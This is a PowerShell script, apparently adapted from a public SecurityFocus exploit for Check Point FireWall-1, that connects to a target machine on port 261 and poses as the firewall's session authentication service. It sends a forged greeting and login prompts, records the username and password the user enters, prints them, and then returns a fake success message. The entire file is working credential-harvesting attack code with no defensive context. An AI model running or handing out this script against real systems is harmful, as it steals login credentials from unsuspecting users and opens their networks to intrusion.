<#

Based on the work of Andrew Danforth <acd@weirdness.net>
http://www.securityfocus.com/bid/1661/exploit

#>

[CmdletBinding()]
param (
     [Parameter(Mandatory=$true, ValueFromPipelineByPropertyName=$true, Position=0)]
        [ValidateScript({$_ -match [IPAddress]$_ })]  
        [string] $TargetIP,
    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true, Position=1)] 
        [Int32] $TargetPort = 261,
    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true, Position=2)] 
        [String] $FirewallName = "Corporate Firewall",
    [Parameter(Mandatory=$false, ValueFromPipelineByPropertyName=$true, Position=3)] 
        [String] $PasswordPrompt = "FireWall-1 password"
)


function Get-ReturnTCPStream {
param(
    $Stream
)    
    $buffer = New-Object System.Byte[] 1024
    $encodingASCII = New-Object System.Text.AsciiEncoding

    $returnStream = ""
    $dataRetrieved = $false

    While(!($stream.DataAvailable)){
        continue
    }

    do {                               
        $Stream.ReadTimeout = 1000
        $dataRetrieved = $false
        do {
            try {             
                $bytesRead = $Stream.Read($buffer, 0, 1024)             
                if($bytesRead -gt 0) {
                    $dataRetrieved = $true
                    $returnStream += ($encodingASCII.GetString($buffer, 0, $bytesRead))                    
                }
            } catch { $dataRetrieved = $false; $bytesRead = 0 }
        } while($bytesRead -gt 0 -and $tcpConnection.Connected)
    } while($dataRetrieved -and $tcpConnection.Connected)
    
    $returnStream
}

try {
    $tcpConnection = New-Object System.Net.Sockets.TcpClient($targetIP, $targetPort)
    $tcpStream = $tcpConnection.GetStream()
    $reader = New-Object System.IO.StreamReader($tcpStream)
    $writer = New-Object System.IO.StreamWriter($tcpStream)
    $writer.AutoFlush = $true

    while ($tcpConnection.Connected) {    
    
        Write-Output "Socket $($tcpConnection.GetHashCode()) connected"        
        $command = "220 FW-1 Session Authentication Request from $FirewallName`n`r";
        $writer.WriteLine($command)
        Write-Output "Greeting sent to $targetIP"
        $command = "331 User:`n`r"
        $writer.WriteLine($command)
        Write-Output "User request sent"

        $user = Get-ReturnTCPStream -Stream $tcpStream
        
        Write-Output "User: $user"
        
        $command = "331 *$PasswordPrompt :"
        $writer.WriteLine($command) 

        $password = Get-ReturnTCPStream -Stream $tcpStream
        Write-Output "Password: $password"

        $command = "200 User username authenticated by FireWall-1 authentication."
        $writer.WriteLine($command) | Out-Null
        Write-Output "User 'authenticated' ;-)"
        $command = "230 OK"
        $writer.WriteLine($command) | Out-Null
        $writer.Flush()
        start-sleep -Milliseconds 500

        $reader.Close()
        $writer.Close()
        $tcpConnection.Close()

        Write-Output "TCP connection closed"
    }          
    
}
catch {
    $_
}